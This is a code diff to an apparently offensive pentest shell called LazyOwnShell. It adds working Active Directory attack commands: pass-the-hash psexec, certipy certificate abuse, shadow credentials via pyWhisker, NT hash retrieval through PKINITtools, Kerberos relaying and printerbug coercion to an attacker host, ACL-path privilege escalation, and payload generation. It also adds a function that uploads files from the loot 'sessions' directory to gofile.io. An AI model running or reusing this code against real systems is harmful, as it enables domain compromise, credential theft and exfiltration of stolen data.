@@ -2556,12 +2556,16 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         elif line == "hash":
-            hashs = get_hash()
-            if not hashs:
+            hash_value = get_hash()
+            if not hash_value:
                 return
+            if ":" in hash_value:
+                hashis = f"-hashes {hash_value}"
+            else:
+                hashis = f"-hashes :{hash_value}"
 
             user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
-            command = f"impacket-psexec {user}@{rhost} -hashes {hashs}"
+            command = f"impacket-psexec {user}@{rhost} {hashis}"
             print_msg(command)
             os.system(command)
             return
@@ -10589,6 +10593,15 @@ class LazyOwnShell(cmd2.Cmd):
             To execute the command for all users:
             >>> do_bloodyAD("")
         """
+        path = os.getcwd()
+        bloodyad_git = "https://github.com/CravateRouge/bloodyAD.git"
+        bloodyad_path = os.path.join("external", ".exploit", "bloodyad")
+        bloodyad_path = f"{path}/{bloodyad_path}"
+
+        if not os.path.exists(bloodyad_path):
+            os.system(f"git clone {bloodyad_git} {bloodyad_path}")
+            os.system(f"cd {bloodyad_path} && pip install -r requirements.txt")
+
         url = self.params["url"]
         rhost = self.params["rhost"]
         path = os.getcwd()
@@ -10617,12 +10630,12 @@ class LazyOwnShell(cmd2.Cmd):
         sub = input("enter the subdomain example dc01: ")
         if selection.isdigit():
             selected_user = users[int(selection) - 1]
-            command = f"export KRB5CCNAME=/tmp/{selected_user}.ccache ; bloodyAD --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {selected_user} -k  add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {selected_user}"
+            command = f"export KRB5CCNAME=/tmp/{selected_user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {selected_user} -k  add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {selected_user}"
             print_msg(command)
             os.system(command)
         else:
             for user in users:
-                command = f"export KRB5CCNAME=/tmp/{user}.ccache ; bloodyAD --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {user} -k add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {user}"
+                command = f"export KRB5CCNAME=/tmp/{user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {user} -k add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {user}"
                 print_msg(command)
                 os.system(command) 
 
@@ -10975,8 +10988,7 @@ class LazyOwnShell(cmd2.Cmd):
             ivy stageless_local -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O stageless.js
             ivy one_liner -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -O test.png -stageless
         """
-        
-        # Check if Ivy is installed
+
         if not is_binary_present("Ivy"):
             print_warn(f"Ivy is not installed. Installing Ivy... to download option {GREEN}50")
             p.onecmd("download_external")
@@ -10984,7 +10996,7 @@ class LazyOwnShell(cmd2.Cmd):
             os.system("go get github.com/KyleBanks/XOREncryption/Go")
             os.system("go build Ivy.go")
         
-        # Define options for different payload types
+
         options = {
             "staged_inject": {
                 "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -O sessions/{output_file}"
@@ -11023,8 +11035,7 @@ class LazyOwnShell(cmd2.Cmd):
                 "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file} -url {url} -delivery macro -stageless"
             }
         }
-        
-        # User input for selecting payload type and parameters
+
         print_warn("Select the payload type:")
         for i, option in enumerate(options.keys(), start=1):
             print_msg(f"{i}. {option.replace('_', ' ').title()}")
@@ -17158,13 +17169,19 @@ class LazyOwnShell(cmd2.Cmd):
         1. Validates the target IP or hostname specified in the line argument.
         2. If line is "find", it executes the certipy find command to enumerate AD CS.
         3. If line is "shadow", it prompts for an account and executes the certipy shadow command.
-        4. If line does not match "pass", "hash", "find", or "shadow", it displays an error message with usage instructions.
+        4. If line is "req", it prompts for user details and executes the certipy req command to request a certificate.
+        5. If line is "auth", it prompts for PFX details and executes the certipy auth command for authentication.
+        6. If line is "update", it prompts for user details and executes the certipy account update command.
+        7. If line does not match any valid actions, it displays an error message with usage instructions.
 
         Parameters:
         line (str): Command argument specifying the action mode.
                     If "find", it enumerates AD CS.
                     If "shadow", it abuses shadow credentials for account takeover.
-                    If neither, it displays an error message with usage instructions.
+                    If "req", it requests a certificate.
+                    If "auth", it authenticates using a PFX file.
+                    If "update", it updates user information.
+                    If none of these, it displays an error message with usage instructions.
 
         Returns:
         None
@@ -17187,9 +17204,35 @@ class LazyOwnShell(cmd2.Cmd):
             os.system(command)
             return
 
-        else:
-            print_error("Incorrect usage. Use 'pass' to authenticate with credentials, 'hash' to use a hash, 'find' to enumerate AD CS, or 'shadow' to abuse shadow credentials.")
+        elif line == "req":
+            user = input("    [!] Enter Username for certificate request: ")
+            password = input("    [!] Enter password for certificate request: ")
+            ca = input("    [!] Enter CA name (default: certified-DC01-CA): ") or 'certified-DC01-CA'
+            template = input("    [!] Enter template name (default: CertifiedAuthentication): ") or 'CertifiedAuthentication'
+            command = f"certipy req -username {user}@{domain} -p {password} -ca {ca} -template {template}"
+            print_msg(command)
+            os.system(command)
             return
+
+        elif line == "auth":
+            pfx_file = input("    [!] Enter path to PFX file: ")
+            command = f"certipy auth -pfx {pfx_file} -domain {domain}"
+            print_msg(command)
+            os.system(command)
+            return
+
+        elif line == "update":
+            user = input("    [!] Enter Username to update: ")
+            new_upn = input("    [!] Enter new UPN for user: ")
+            command = f"certipy account update -username {user}@{domain} -upn {new_upn}"
+            print_msg(command)
+            os.system(command)
+            return
+
+        else:
+            print_error("Incorrect usage. Use 'find' to enumerate AD CS, 'shadow' to abuse shadow credentials, 'req' to request a certificate, 'auth' to authenticate with PFX, or 'update' to change user information.")
+            return
+
 
     def do_follina(self, line):
         """
@@ -17484,7 +17527,687 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(command)
         os.system(command)
 
+    def do_pywhisker(self, line):
+        """
+        Executes the pyWhisker tool for manipulating the msDS-KeyCredentialLink attribute of a target user or computer.
 
+        This function performs the following actions:
+        1. Checks if pyWhisker is installed; if not, it clones the repository.
+        2. Executes various actions on the msDS-KeyCredentialLink attribute, allowing actions like listing, adding, 
+        spraying, removing, clearing, exporting, or importing KeyCredentials for a specified target user or computer.
+
+        The command accepts different authentication options:
+        - NTLM (Cleartext password or Pass-the-hash)
+        - Kerberos (Cleartext password, Pass-the-key, Pass-the-cache)
+
+        Parameters:
+        line (str): Command argument specifying the pyWhisker action and options.
+                    Expected format:
+                        - -t TARGET_SAMNAME or -tl TARGET_SAMNAME_LIST for the target account(s)
+                        - -a ACTION to specify the action (list, add, spray, remove, clear, info, export, import)
+                        - Optional flags for authentication and connection
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        pywhisker_git = "https://github.com/ShutdownRepo/pywhisker.git"
+        pywhisker_path = os.path.join("external", ".exploit", "pywhisker")
+        domain = self.params["domain"]
+
+        credentials_path = f"{path}/sessions/credentials.txt"
+        pywhisker_path = f"{path}/{pywhisker_path}"
+        if not os.path.exists(pywhisker_path):
+            clone = f"git clone {pywhisker_git} {pywhisker_path}"
+            os.system(clone)
+
+        if not line:
+            line = input("    [!] Enter action (Default add): ") or 'add'
+        target = input("    [!] Enter the user target(default management_svc): ") or 'management_svc'
+        if not os.path.exists(credentials_path):
+            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
+            return
+        credentials = get_credentials()
+        if not credentials:
+            return
+        for user, passwd in credentials:
+            command = f"cd sessions && python3 {pywhisker_path}/pywhisker/pywhisker.py -d \"{domain}\" -u \"{user}\" -p \"{passwd}\" --target \"{target}\" --action \"{line}\""
+            print_msg(command)
+            os.system(command)
+        return
+
+    def do_owneredit(self, line):
+        """
+        Executes the Impacket owneredit tool for manipulating ownership of Active Directory objects.
+
+        This function performs the following actions:
+        1. Prompts the user for necessary parameters if not provided.
+        2. Executes the command to change the owner of a specified target in Active Directory.
+
+        The command accepts the following parameters:
+        - New owner (user) for the target object.
+        - Target object to be manipulated.
+        - Domain credentials for authentication.
+        - DC IP address for the domain controller.
+
+        Parameters:
+        line (str): Command argument specifying the new owner and target options.
+                    Expected format:
+                        - -new-owner NEW_OWNER for the new owner
+                        - -target TARGET_OBJECT for the target object
+                        - Required flags for authentication and connection
+
+        Returns:
+        None
+        """
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+        user = input("    [!] Enter new owner (default judith.mader): ") or 'judith.mader'
+        target = input("    [!] Enter the target object (default management): ") or 'management'
+        rhost = input(f"    [!] Enter the DC IP address (default {rhost}): ") or rhost
+        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"
+
+        if not os.path.exists(credentials_path):
+            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
+            return
+
+        credentials = get_credentials()
+        if not credentials:
+            return
+
+        for user, passwd in credentials:
+            command = f"impacket-owneredit -action write -new-owner \"{user}\" -target \"{target}\" \"{domain}/{user}:{passwd}\" -dc-ip \"{rhost}\""
+            print_msg(command)
+            os.system(command)
+        return
+
+    def do_net_rpc_addmem(self, line):
+        """
+        Executes the net rpc group addmem command to add a user to a specified group in Active Directory.
+
+        This function performs the following actions:
+        1. Prompts the user for necessary parameters if not provided.
+        2. Executes the command to add a user to a specified group in Active Directory.
+
+        The command accepts the following parameters:
+        - Group name to which the user will be added.
+        - User to be added to the group.
+        - Domain credentials for authentication.
+        - DC IP address for the domain controller.
+
+        Parameters:
+        line (str): Command argument specifying the user and group options.
+                    Expected format:
+                        - "GROUP_NAME" for the group name
+                        - "$USER" for the user to add
+                        - Required flags for authentication and connection
+
+        Returns:
+        None
+        """
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+        user = input("    [!] Enter the user to add (default judith.mader): ") or 'judith.mader'
+        group = input("    [!] Enter the group name (default Management): ") or 'Management'
+        rhost = input(f"    [!] Enter the DC IP address (default {rhost}): ") or rhost
+        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"
+
+        if not os.path.exists(credentials_path):
+            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
+            return
+
+        credentials = get_credentials()
+        if not credentials:
+            return
+
+        for user, passwd in credentials:
+            command = f"net rpc group addmem \"{group}\" \"{user}\" -U \"{domain}/{user}%{passwd}\" -S \"{rhost}\""
+            print_msg(command)
+            os.system(command)
+        return
+
+    def do_pth_net(self, line):
+        """
+        Executes the Pass-the-Hash (PTH) Net tool to change the password of an Active Directory account.
+
+        This function performs the following actions:
+        1. Prompts the user for necessary parameters if not provided.
+        2. Executes the command to change the password for the specified account using Pass-the-Hash authentication.
+
+        The command accepts the following parameters:
+        - Target account for which the password will be changed.
+        - New password to be set for the account.
+        - Domain credentials for authentication.
+        - DC IP address for the domain controller.
+        - NTLM hash for Pass-the-Hash authentication.
+
+        Parameters:
+        line (str): Command argument specifying the target account and new password options.
+                    Expected format:
+                        - ACCOUNT for the target account (default: ca_operator)
+                        - NEW_PASSWORD for the new password (default: newP@ssword2022)
+                        - Required flags for authentication and connection
+
+        Returns:
+        None
+        """
+        target_account = input("    [!] Enter the target account (default: ca_operator): ") or 'ca_operator'
+        new_password = input("    [!] Enter the new password (default: newP@ssword2022): ") or 'newP@ssword2022'
+        domain = self.params["domain"]
+        hash_value = input("    [!] Enter the NTLM hash for Pass-the-Hash authentication: ")
+        rhost = self.params["rhost"]
+
+        command = f"pth-net rpc password \"{target_account}\" \"{new_password}\" -U \"{domain}/management_svc%{hash_value}\" -S \"{rhost}\""
+        print_msg(command)
+        os.system(command)
+        return
+
+    
+    def do_gettgtpkinit_py(self, line):
+        """
+        Executes the gettgtpkinit.py tool from PKINITtools to request a TGT using Kerberos PKINIT with a PFX or PEM certificate.
+
+        This function performs the following actions:
+        1. Checks if PKINITtools is installed; if not, it clones the repository and installs dependencies.
+        2. Requests a TGT using the specified PFX or PEM certificate and outputs the TGT to the specified ccache file.
+
+        Parameters:
+        line (str): Command arguments specifying the certificate file and ccache location.
+                    Expected format:
+                        - domain/username ccache
+                        - Additional flags like -cert-pfx file, -pfx-pass password, -cert-pem file, etc.
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        pkinit_git = "https://github.com/dirkjanm/PKINITtools.git"
+        pkinit_path = os.path.join("external", ".exploit", "PKINITtools")
+        pkinit_path = f"{path}/{pkinit_path}"
+
+        if not os.path.exists(pkinit_path):
+            os.system(f"git clone {pkinit_git} {pkinit_path}")
+            os.system("pip3 install impacket minikerberos")
+
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+  
+        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"
+
+        if not os.path.exists(credentials_path):
+            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
+            return
+
+        credentials = get_credentials()
+        pfx = get_users_dic("pfx")
+        
+        if not credentials:
+            return
+        
+        if not pfx:
+            return
+        
+        for user, passwd in credentials:
+            command = f"cd sessions && python3 {pkinit_path}/gettgtpkinit.py {domain}/{user} -cert-pfx {pfx} -pfx-pass {passwd} {user}.cache"
+            print_msg(command)
+            os.system(command)
+        return
+
+    def do_getnthash_py(self, line):
+        """
+        Executes the getnthash.py tool from PKINITtools to retrieve the NT hash using a Kerberos U2U TGS request.
+
+        This function performs the following actions:
+        1. Checks if PKINITtools is installed; if not, it clones the repository and installs dependencies.
+        2. Retrieves the NT hash using the AS-REP key from a previously generated TGT.
+
+        Parameters:
+        line (str): Command arguments specifying the AS-REP key and target identity.
+                    Expected format:
+                        - identity
+                        - Additional flags like -key KEY, -dc-ip ip address, etc.
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        pkinit_git = "https://github.com/dirkjanm/PKINITtools.git"
+        pkinit_path = os.path.join("external", ".exploit", "PKINITtools")
+        pkinit_path = f"{path}/{pkinit_path}"
+
+        if not os.path.exists(pkinit_path):
+            os.system(f"git clone {pkinit_git} {pkinit_path}")
+            os.system("pip3 install impacket minikerberos")
+
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+  
+        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"
+
+        if not os.path.exists(credentials_path):
+            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
+            return
+
+        credentials = get_credentials()
+        
+        if not credentials:
+            return
+        
+        for user, passwd in credentials:
+            command = f"cd sessions && export KRB5CCNAME={user}.cache && python3 {pkinit_path}/getnthash.py {domain}/{user} -key {passwd}"
+            print_msg(command)
+            os.system(command)
+        return
+
+    def do_gets4uticket_py(self, line):
+        """
+        Executes the gets4uticket.py tool from PKINITtools to request an S4U2Self service ticket using Kerberos.
+
+        This function performs the following actions:
+        1. Checks if PKINITtools is installed; if not, it clones the repository and installs dependencies.
+        2. Requests a service ticket using the S4U2Self protocol and outputs it to the specified ccache file.
+
+        Parameters:
+        line (str): Command arguments specifying the kerberos_connection_url, SPN, target user, and ccache.
+                    Expected format:
+                        - kerberos_connection_url spn targetuser ccache
+                        - Additional flags like -v for verbose output.
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        pkinit_git = "https://github.com/dirkjanm/PKINITtools.git"
+        pkinit_path = os.path.join("external", ".exploit", "PKINITtools")
+        pkinit_path = f"{path}/{pkinit_path}"
+
+        if not os.path.exists(pkinit_path):
+            os.system(f"git clone {pkinit_git} {pkinit_path}")
+            os.system("pip3 install impacket minikerberos")
+
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+  
+        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"
+
+        if not os.path.exists(credentials_path):
+            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
+            return
+
+        credentials = get_credentials()
+        
+        if not credentials:
+            return
+        
+        for user, passwd in credentials:
+            command = f"cd sessions && python3 {pkinit_path}/gets4uticket.py kerberos+ccache://{domain}\\{user}:{user}.cache@{rhost} cifs/{user}@{domain} {user}@{domain} {user}.cache -v"
+            print_msg(command)
+            os.system(command)
+        return
+
+    def do_aclpwn_py(self, line):
+        """
+        Executes the aclpwn.py tool to find and exploit ACL paths for privilege escalation in an Active Directory environment.
+
+        This function performs the following actions:
+        1. Checks if aclpwn is installed; if not, it installs the package.
+        2. Finds an exploit path using specified starting and target points in Active Directory.
+        3. Executes the path to escalate privileges if the path is found.
+
+        Parameters:
+        line (str): Command arguments specifying the find and target points, domain, and optional flags.
+                    Expected format:
+                        - -f starting_point -ft starting_type -d domain
+                        - Additional flags like -t target, -tt target_type, --server, -dry, --restore, etc.
+
+        Returns:
+        None
+        """
+
+        try:
+            import aclpwn
+        except ImportError:
+            os.system("pip install aclpwn")
+        
+        path = os.getcwd()
+        aclpwn_command = "aclpwn"
+
+
+        
+        domain = self.params["domain"]
+        rhost = self.params["rhost"]
+        target = input("    [!] Enter target name(default target): ") or 'target'
+        computer = input("    [!] Enter computer name(default computer): ") or 'computer'
+        command = f"{aclpwn_command} -f {target} -ft {computer} -d {domain}"
+        if rhost:
+            command += f" --server {rhost} "
+        
+        print_msg(f"Running dry validation: {command} -dry")
+        os.system(f"{command} -dry")
+
+        user_confirmation = input("    [?] Would you like to proceed with exploitation? (yes/no): ").strip().lower()
+        if user_confirmation == "yes":
+            print_msg(f"Executing ACL path exploitation: {command}")
+            os.system(command)
+        else:
+            print_warn("Exploitation aborted by user.")
+        
+        return
+
+    def do_addspn_py(self, line):
+        """
+        Executes the addspn.py tool to manage Service Principal Names (SPNs) on Active Directory accounts via LDAP.
+
+        This function performs the following actions:
+        1. Checks if Krbrelayx is installed; if not, it clones the repository and installs dependencies.
+        2. Adds, removes, or queries SPNs on the specified target based on the provided options.
+
+        Parameters:
+        line (str): Command arguments specifying the target hostname, user credentials, and SPN actions.
+                    Expected format:
+                        - hostname user password target spn -options
+                        - Options include:
+                        - -r to remove an SPN
+                        - -q to query current SPNs
+                        - -a to add SPN via msDS-AdditionalDnsHostName
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        krbrelayx_git = "https://github.com/dirkjanm/krbrelayx.git"
+        krbrelayx_path = os.path.join("external", ".exploit", "krbrelayx")
+        krbrelayx_path = f"{path}/{krbrelayx_path}"
+
+        if not os.path.exists(krbrelayx_path):
+            os.system(f"git clone {krbrelayx_git} {krbrelayx_path}")
+            os.system("pip3 install impacket ldap3 dnspython")
+
+        subdomain = self.params["subdomain"]
+        domain = self.params["domain"]
+        credentials = get_credentials()
+
+        if not credentials:
+            print_error("Credentials required. Use: createcredentials admin:admin")
+            return
+
+        for user, password in credentials:
+            spn_command = f"python3 {krbrelayx_path}/addspn.py -u {domain}\\\\{user} -p {password} -t {domain} -s cifs/{subdomain}.{domain} {domain}"
+            print_msg(spn_command)
+            os.system(spn_command)
+        return
+
+
+    def do_dnstool_py(self, line):
+        """
+        Executes the dnstool.py tool to modify Active Directory-integrated DNS records.
+
+        This function performs the following actions:
+        1. Checks if Krbrelayx is installed; if not, it clones the repository and installs dependencies.
+        2. Modifies DNS records by adding, removing, or querying based on the specified options.
+
+        Parameters:
+        line (str): Command arguments specifying the DNS action, target record, and data.
+                    Expected format:
+                        - hostname user password record action -options
+                        - Options include:
+                        - -a to add a record
+                        - -r to remove a record
+                        - --forest to target ForestDnsZones
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        krbrelayx_git = "https://github.com/dirkjanm/krbrelayx.git"
+        krbrelayx_path = os.path.join("external", ".exploit", "krbrelayx")
+        krbrelayx_path = f"{path}/{krbrelayx_path}"
+
+        if not os.path.exists(krbrelayx_path):
+            os.system(f"git clone {krbrelayx_git} {krbrelayx_path}")
+            os.system("pip3 install impacket ldap3 dnspython")
+
+
+        subdomain = self.params["subdomain"]
+        domain = self.params["domain"]
+        lhost = self.params["lhost"]
+        credentials = get_credentials()
+
+        if not credentials:
+            print_error("Credentials required. Use: createcredentials admin:admin")
+            return
+
+        for user, password in credentials:
+            dns_command = f"python3 {krbrelayx_path}/dnstool.py -u {domain}\\\\{user} -p {password} --zone {domain} -r {subdomain}.{domain} -a add -t A -d {lhost} {domain}"
+            print_msg(dns_command)
+            os.system(dns_command)
+        return
+
+
+    def do_printerbug_py(self, line):
+        """
+        Executes the printerbug.py tool to trigger the SpoolService bug via RPC backconnect.
+
+        This function performs the following actions:
+        1. Checks if Krbrelayx is installed; if not, it clones the repository and installs dependencies.
+        2. Executes the printerbug tool to attempt an RPC backconnect to the specified attacker host.
+
+        Parameters:
+        line (str): Command arguments specifying the target and attacker host.
+                    Expected format:
+                        - target_username@target_host attacker_host
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        krbrelayx_git = "https://github.com/dirkjanm/krbrelayx.git"
+        krbrelayx_path = os.path.join("external", ".exploit", "krbrelayx")
+        krbrelayx_path = f"{path}/{krbrelayx_path}"
+
+        if not os.path.exists(krbrelayx_path):
+            os.system(f"git clone {krbrelayx_git} {krbrelayx_path}")
+            os.system("pip3 install impacket ldap3 dnspython")
+
+        lhost = self.params["lhost"]
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+
+        credentials = get_credentials()
+
+        if not credentials:
+            print_error("Credentials required. Use: createcredentials admin:admin")
+            return
+
+        for user, password in credentials:
+            
+            target = input(f"    [!] Enter target username@host (e.g., '{domain}\\\\{user}@{rhost}'): ") or f'{domain}\\\\{user}@{rhost}'
+            attacker = input(f"    [!] Enter attacker hostname or IP for RPC backconnect default {lhost}: ") or lhost
+            printerbug_command = f"python3 {krbrelayx_path}/printerbug.py {target} {attacker}"
+            print_msg(printerbug_command)
+            copy2clip(password)
+            os.system(printerbug_command)
+
+        return
+
+
+    def do_krbrelayx_py(self, line):
+        """
+        Executes the krbrelayx.py tool for Kerberos relaying or unconstrained delegation abuse.
+
+        This function performs the following actions:
+        1. Checks if Krbrelayx is installed; if not, it clones the repository and installs dependencies.
+        2. Relays Kerberos tickets or abuses unconstrained delegation to access target services.
+
+        Parameters:
+        line (str): Command arguments specifying the target and options.
+                    Expected format:
+                        - target options
+                        - Options include:
+                        - -t target_host to specify the target host
+                        - -l loot directory to save TGTs or dump information
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        krbrelayx_git = "https://github.com/dirkjanm/krbrelayx.git"
+        krbrelayx_path = os.path.join("external", ".exploit", "krbrelayx")
+        krbrelayx_path = f"{path}/{krbrelayx_path}"
+
+        if not os.path.exists(krbrelayx_path):
+            os.system(f"git clone {krbrelayx_git} {krbrelayx_path}")
+            os.system("pip3 install impacket ldap3 dnspython")
+
+
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+        credentials = get_credentials()
+
+        if not credentials:
+            print_error("Credentials required. Use: createcredentials admin:admin")
+            return
+
+        for user, password in credentials:
+            relay_command = f"python3 {krbrelayx_path}/krbrelayx.py -t smb://{rhost} -l loot -s {user} -p {password}"
+            print_msg(relay_command)
+            os.system(relay_command)
+        return
+
+
+    def do_autoblody(self, line):
+        """
+        Executes the autobloody tool for automating Active Directory privilege escalation paths.
+
+        This function performs the following actions:
+        1. Checks if autobloody is installed; if not, it clones the repository and installs dependencies.
+        2. Executes the autobloody command to find and exploit privilege escalation paths.
+
+        Parameters:
+        line (str): Command arguments specifying the source and target objects and options.
+                    Expected format:
+                        - -u username for NTLM authentication
+                        - -p password for NTLM authentication
+                        - --host domain_controller_ip for the IP of the Domain Controller
+                        - -dp neo4j_password for Neo4j database password
+                        - -ds source_label for the source node label in BloodHound
+                        - -dt target_label for the target node label in BloodHound
+
+        Returns:
+        None
+        """
+        if not is_binary_present("autobloody"):
+            os.system("pip install autobloody")
+
+        source =  input (f"    [!] Enter the source (Name property in bloodhound default {self.params["domain"]}): ") or self.params["domain"]
+        target = input (f"    [!] Enter the target (Name property in bloodhound): ")
+        credentials = get_credentials()
+
+        if not credentials:
+            print_error("Credentials required. Use: createcredentials admin:admin")
+            return
+
+        for user, passwd in credentials:
+            username = user
+            password = passwd
+
+        rhost = self.params["rhost"]
+        neo4j_password = input("    [!] Enter password to neoj4j DB(default neo4j): ") or 'neo4j'
+        domain = self.params["domain"]
+
+        autoblody_command = (
+            f"autobloody "
+            f"-u {username} -p '{password}' --host {rhost} "
+            f"-dp '{neo4j_password}' -ds '{source}' -dt '{target}' "
+            f"-d '{domain}'"
+        )
+
+        print_msg(autoblody_command)
+        os.system(autoblody_command)
+        return
+
+    def do_upload_gofile(self, line):
+        """
+        Uploads a file to Gofile storage.
+
+        This function performs the following actions:
+        1. Prepares the file and folder ID for upload.
+        2. Sends a POST request to Gofile API with the file and authorization token.
+        3. Handles the response from the API and prints the result.
+
+        Parameters:
+        line (str): Command arguments specifying the file path and options.
+                    Expected format:
+                        - <file_path>
+                        - Options include:
+                        - --folderId <folder_id> to specify the folder where the file should be uploaded
+
+        Returns:
+        None
+        """
+        excluded_extensions = ['.grisun0']
+        file_list = []
+        for root, dirs, files in os.walk("sessions"):
+            for file in files:
+                if not any(file.endswith(ext) for ext in excluded_extensions):
+                    file_list.append(os.path.join(root, file))
+        
+        if not file_list:
+            print_error("No files found in the sessions directory.")
+            return
+    
+        print_msg("Select a file to Upload:")
+        for idx, file in enumerate(file_list, 1):
+            print_msg(f"  {idx}) {file}")
+
+        file_choice = input(f"    [!] Enter the number of the file (1-{len(file_list)}): ").strip()
+        
+        try:
+            file_choice = int(file_choice)
+            if file_choice < 1 or file_choice > len(file_list):
+                print_warn("Invalid choice.")
+                return
+            selected_file = file_list[file_choice - 1]
+        except ValueError:
+            print_error("Invalid input. Please enter a number.")
+            return
+        
+        file_path = selected_file
+        
+        if not os.path.isfile(file_path):
+            print_error(f"File '{file_path}' does not exist.")
+            return
+
+        url = 'https://store1.gofile.io/contents/uploadfile'
+    
+        files = {
+            'file': open(file_path, 'rb')
+        }
+        
+        try:
+            response = requests.post(url, files=files)
+            response.raise_for_status()  
+            data = response.json() 
+            
+            if data.get('status') == 'ok':
+                file_info = data['data']
+                print_msg("File uploaded successfully!")
+                print_msg(f"File ID: {file_info['id']}")
+                print_msg(f"File Name: {file_info['name']}")
+                print_msg(f"File Size: {file_info['size']} bytes")
+                print_msg(f"File Type: {file_info['mimetype']}")
+                print_warn(f"Download Page: {file_info['downloadPage']}")
+                print_msg(f"MD5 Hash: {file_info['md5']}")
+                print_msg(f"Created Time: {file_info['createTime']}")
+                print_msg(f"Modified Time: {file_info['modTime']}")
+            else:
+                print_error("Upload failed. Please check the response.")
+        except requests.exceptions.RequestException as e:
+            print_error(f"An error occurred: {e}")
+        finally:
+            files['file'].close()  
+
+        return
 
 if __name__ == "__main__":
     p = LazyOwnShell()
